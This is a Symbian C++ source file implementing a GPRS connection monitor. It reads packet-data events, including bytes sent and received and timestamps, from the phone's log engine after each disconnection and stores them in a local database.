#include "CltGprsMonitor.h"

#include <MsgObserver.rsg>
#include <msvids.h>
	
// Messaging
#include <mtclreg.h> //CClientMtmRegistry
#include <mtclbase.h> //CBaseMtm
#include <SMSCLNT.h> 
#include <SMUTHDR.h>
#include <gsmupdu.h>

//LogEngine
#include <logcli.h>			// LogEngine
#include <logview.h>
#include <logwrap.h> 
	
// Logger
#include "Logger.h"

#include "CltLogEvent.h"
	
// gprs connection is disconnected
_LIT(KStatusDisconnected,"Disconnected");

// gprs connection is opened and still alive
_LIT(KStatusConnected,"Connected");

//-------------------------------------------
// Construction
//-------------------------------------------	
CCltGprsMonitor::CCltGprsMonitor(CLogClient& aLogCli, CCltDatabase& aLogEventDb)
				:CActive(CActive::EPriorityStandard), 
				iLogClient(aLogCli),
				iDb(aLogEventDb)
{	
	iState = EIdle;
	iDbWait = EFalse;
	iNumberToReIssue = 0;
	iGprsMonitorEnable = EFalse;
}

CCltGprsMonitor::~CCltGprsMonitor()
{	
	Cancel();
	delete iLogView;
	delete iLogFilter;	
	iConnMonitor.CancelNotifications();
	iConnMonitor.Close();
	iEventArray.ResetAndDestroy();
}

CCltGprsMonitor* CCltGprsMonitor::NewL(CLogClient& aLogCli, CCltDatabase& aLogEventDb)
{
	CCltGprsMonitor* self = CCltGprsMonitor::NewLC(aLogCli,aLogEventDb);
	CleanupStack::Pop(self);
	return self;
}

CCltGprsMonitor* CCltGprsMonitor::NewLC(CLogClient& aLogCli, CCltDatabase& aLogEventDb)
{
	CCltGprsMonitor* self = new (ELeave) CCltGprsMonitor(aLogCli,aLogEventDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
}

void CCltGprsMonitor::ConstructL()
{	
	iLogView = CLogViewEvent::NewL(iLogClient);
	iLogFilter = CLogFilter::NewL();
	
	iLogFilter->SetEventType(KLogPacketDataEventTypeUid);
	iLogFilter->SetDurationType(KLogDurationValid);
	
	//get only disconnected connection
	iLogFilter->SetStatus(KStatusDisconnected());
	
	CActiveScheduler::Add(this);	
	ConnectL();		
}

void CCltGprsMonitor::ConnectL()
{	
	if(!iGprsMonitorEnable)
		return;
	
	TInt err = iConnMonitor.ConnectL();
	if(err != KErrNone) {
//		iReady = EFalse;
		if(Logger::ErrorEnable())
			ERR1(_L("[CCltConnMonitor::ConnectL] iConnMonitor.ConnectL Error: %d"),err)
		return;
	}
	
	err = iConnMonitor.NotifyEventL(*this);
	if(err != KErrNone) {
//		iReady = EFalse;
		if(Logger::ErrorEnable())
			ERR1(_L("[CCltConnMonitor::ConnectL] iConnMonitor.NotifyEventL Error: %d"),err)
		return;
	}
	
//	iReady = ETrue;
	if(Logger::DebugEnable()){
		LOG0(_L("[CCltGprsMonitor::ConnectL] End"))
	}	
}

void CCltGprsMonitor::EventL( const CConnMonEventBase &aConnMonEvent)
{
	TInt eventType = aConnMonEvent.EventType();
	
	//interested only EConnMonCreateConnection and EConnMonDeleteConnection event
	switch(eventType)
	{
		
	case EConnMonDeleteConnection: // gprs connection is disconnected
		{
			TUint connectionId = aConnMonEvent.ConnectionId();
			if(Logger::DebugEnable())
				LOG1(_L("[CCltGprsMonitor::EventL] EventType: EConnMonDeleteConnection, Id: %d "),connectionId)
			
			// must get id to make sure its correction			
			
			//increasing q
			iNumberToReIssue++;
			
			// start querying log engine database
			IssueRequest();			
			
		}break;
	default:
		break;	
	}
}

void CCltGprsMonitor::IssueRequest()
{	
	if(Logger::DebugEnable())
		LOG2(_L("[CCltGprsMonitor::IssueRequest] Entering, iStateL %d, iNumberToReIssue: %d"),iState,iNumberToReIssue)
	
	if(!iGprsMonitorEnable)
		return;
	
	//now active object has finished the job
	//its time to append the log that it got to database
	if(!IsActive() && iState == EIdle && iNumberToReIssue <= 0){
		AppendToDatabase();
		return;
	}
	
	if(!IsActive())
	{	
		//allow to query log db when state is EIdle
		if((iState != EIdle) || (iNumberToReIssue <= 0)) {	
			return;
		}
				
		iNumberToReIssue--;
		
		TBool result = EFalse;			
		
		ResetCActiveStatus();
		TRAPD(error, result = iLogView->SetFilterL(*iLogFilter, iStatus));
		
		if(error) {
			if(Logger::ErrorEnable())
				ERR1(_L("[CCltGprsMonitor::IssueRequest] iLogView->SetFilterL Error: "),error)
			return;
		}
		
		result = result && (error==KErrNone);
		if(result)
		{		
			iState = EWaitingEvent;
			SetActive();
			
			if(Logger::DebugEnable())
				LOG0(_L("[CCltGprsMonitor::IssueRequest] SetActive."))
			
		}
	}		
	
	
	if(Logger::DebugEnable())
		LOG1(_L("[CCltGprsMonitor::IssueRequest] End, iNumberToReIssue: %d"),iNumberToReIssue)
	
}

//-------------------------------------------
// CAtive's implementation
//-------------------------------------------
void CCltGprsMonitor::DoCancel()
{	
	if(Logger::DebugEnable())
		LOG0(_L("[CCltGprsMonitor::DoCancel] ** Entering"))	
	
	iLogView->Cancel();	
}

TInt CCltGprsMonitor::RunError(TInt aError)
{	
	if(Logger::ErrorEnable()) {
		ERR1(_L("[CCltGprsMonitor::RunError] aError = 0x%X"),aError)
	}
	return KErrNone;
}

void CCltGprsMonitor::RunL()
{
	ProcessRunL();
}	

void CCltGprsMonitor::ProcessRunL()
{	
		
	if(Logger::DebugEnable())
		LOG1(_L("[CCltGprsMonitor::RunL] iStatus: %d"),iStatus.Int())	
	
	if(iStatus >= KErrNone)
	{			
		switch(iState)
		{			
			case EWaitingEvent:
				{	
					if(Logger::DebugEnable())
						LOG0(_L("[CCltGprsMonitor::RunL] case EWaitingEvent"))
					
					ResetCActiveStatus();
					if(iLogView->FirstL(iStatus)) {
						iState = EGettingEvent;
						SetActive();
					}
				}
				break;
				
				/**
				* Read all events in the logengine database
				* NextL method is called to travers to the next row 
				* CltDbEngine class handles duplicated event being inserted
				* 
				* It is not ideal way, but the reason it does this because there ii
				*/
			case EGettingEvent:
				{	
					if(Logger::DebugEnable())
						LOG0(_L("[CCltGprsMonitor::RunL] case  EGettingEvent"))	
					
					iState = EWaitingEvent;						
					if(!IsViewEmpty(*iLogView)) {
						
						if(Logger::DebugEnable())
							LOG0(_L("CCltGprsMonitor.RunL Veiew Not Empty"))
						
						const CLogEvent& event = iLogView->Event();												
						DumpEvent(event,EFalse);
						
						IssueRequest();
						
						ResetCActiveStatus();

						// read next row
						if (iLogView->NextL(iStatus)) {
							iState = EGettingEvent;
							// if there is another entry so issue the request to move to the next entry.
							SetActive();
						} else  // finished
						{									
							iState = EIdle;							
							IssueRequest();
						}
					}
				}
				break;
			
			case EIdle:				
			default:
				iState = EIdle;
			}	
	}
	else {	
		if(Logger::ErrorEnable())
			ERR1(_L("[CCltGprsMonitor::RunL] Error: %d"),iStatus.Int())	
		//User::Leave(iStatus.Int());		
	}
	
	if(Logger::DebugEnable()) {	
		LOG0(_L("[CCltGprsMonitor::RunL] End "))
	}
}

/**
* get log event details
*/	
void CCltGprsMonitor::DumpEvent(const CLogEvent &aEvent, TBool aDuplicate)
{	
	//@note: aEvent.Time() is time just disconnected
	
	if(Logger::DebugEnable())
		LOG0(_L("[CCltGprsMonitor::DumpEvent] Start -------------"))		
	
	if(!iGprsMonitorEnable)
		return;
	
	if(aDuplicate)	{
		return;
	}
	
	// add CLogEvent to database
	
	CCltLogEvent* log = CCltLogEvent::NewL(aEvent);	
	iEventArray.Append(log);
	
	if(!Logger::DebugEnable())
		return;
	
	//--- DEBUG ----
	TBuf<10> state;
		
	TLogId id = aEvent.Id();
	TPtrC ptrDir = aEvent.Direction();
	TPtrC desc = aEvent.Description();
	TPtrC subject = aEvent.Subject();
	TPtrC status = aEvent.Status();
	const TDesC& remoteParty = aEvent.RemoteParty();

	TLogFlags flag = aEvent.Flags();	
		
	// ---------- Printing Data ----------------
	TUint32 durat = (TUint32)aEvent.Duration();
	
	LOG4(_L("[CCltGprsMonitor::DumpEvent] Id: %d, Status: %S, Subject: %S, duration: %d "),id,&status,&subject,durat)	

			
	//        LOG Time
	//-----------------------------------------
	TTime logTime = aEvent.Time();	
	TBuf<100> dateFormated;
	
	logTime.FormatL(dateFormated, _L( "%F%Y/%M/%D %H:%T:%S" ) );
	
	const TDesC8& data = aEvent.Data();
	TInt dataLen = data.Length();
	
	//        Number of Bytes sent and received
	//-----------------------------------------
	
	TInt32 sentdata = 0;
	TInt32 recvdata = 0;
			
	if(dataLen > 0)
	{
		TBuf<20> DataBuf; //Data size DataBuf.Zero(); DataBuf.Copy(event.Data()); 
		TBuf<2> comma(_L(","));
		DataBuf.Copy(data);
		TInt pos=DataBuf.Find(comma);
		if(pos > 0)
		{	
			TPtrC sent=DataBuf.Left(pos);
			TPtrC recv=DataBuf.Right(DataBuf.Length()-pos-1);
			
			TBuf<10>Sent(sent); 
			TBuf<10>Recv(recv);
			
			sentdata=Num(Sent);
			recvdata=Num(Recv);			
					
		} 
	}
	
	if(Logger::DebugEnable()) {
		LOG3(_L("[CCltGprsMonitor::DumpEvent] Byte Sent: %d, Received: %d, LogTime: %S "),sentdata,recvdata,&dateFormated)	
		LOG3(_L("[CCltGprsMonitor::DumpEvent] Direction: %S, Desc: %S, IAP: %S "),&ptrDir,&desc, &remoteParty)	
		LOG0(_L("[CCltGprsMonitor::DumpEvent] END -------------"))
	}		
}

//Append LogEvent to database
void CCltGprsMonitor::AppendToDatabase()
{	
	
	if(Logger::DebugEnable())
		LOG0(_L("[CCltGprsMonitor::AppendToDatabase] Entering"))
	
	if(iEventArray.Count() <= 0) {
		iDbWait = EFalse;
		return;
	}
	
	if(!iDb.AcquireLock()) {//db is locked
		iDbWait = ETrue;
		return;
	}
	
	iDbWait = EFalse;
	iDb.AppendL(KLogPacketDataEventTypeUid,iEventArray);		
	
	iEventArray.ResetAndDestroy();	
	
	if(Logger::DebugEnable())
	LOG0(_L("[CCltGprsMonitor::AppendToDatabase] End"))

}

/**
* count event in view to check if it is empty
*/	
TBool CCltGprsMonitor::IsViewEmpty(CLogView& aView)
{	
	TBool result = EFalse;
	TInt count = 0;
	
	TRAPD(error, count = aView.CountL());
	result = (error != KErrNone) || (count<=0);	
	
	return result;
}	

void CCltGprsMonitor::ResetCActiveStatus()
{
	iStatus = KRequestPending;
}

TInt32 CCltGprsMonitor::Num(const TDesC& str)
{	
	TBuf<20> numstr(str);
	char ptr;
	TInt32 number=0;

	for(TInt i=0;i<numstr.Length();i++)
	{
		ptr=numstr[i];
		
		TInt32 num,multiplyby=1;
		char *ptr1=&ptr;
		
		num=atoi(ptr1);

		for(TInt j=0;j<numstr.Length()-i-1;j++)
		multiplyby*=10;

		num*=multiplyby;
		
		number+=num;		
	}
	
	return number;
}

void CCltGprsMonitor::OnDbUnlock()
{	
	if(iDbWait)//check if waiting for lock
		AppendToDatabase();
}

void CCltGprsMonitor::OnSettingChanged(CCltSettings& aSetting)
{	
	
	TBool gprsEnable = aSetting.EventGprsEnable();
	if(gprsEnable == iGprsMonitorEnable) {
		return;
	}
		
	if(!aSetting.IsAppEnabled()) {
		iConnMonitor.Close();
		iGprsMonitorEnable = EFalse;
		
		if(Logger::DebugEnable())
			LOG0(_L("[CCltGprsMonitor::OnSettingChanged] App Paused"))	
		
		return;
	}
	
	if(gprsEnable) {
		iGprsMonitorEnable = gprsEnable;	
		ConnectL();
	} else {
		iConnMonitor.Close();
		iGprsMonitorEnable = gprsEnable;	
	}
}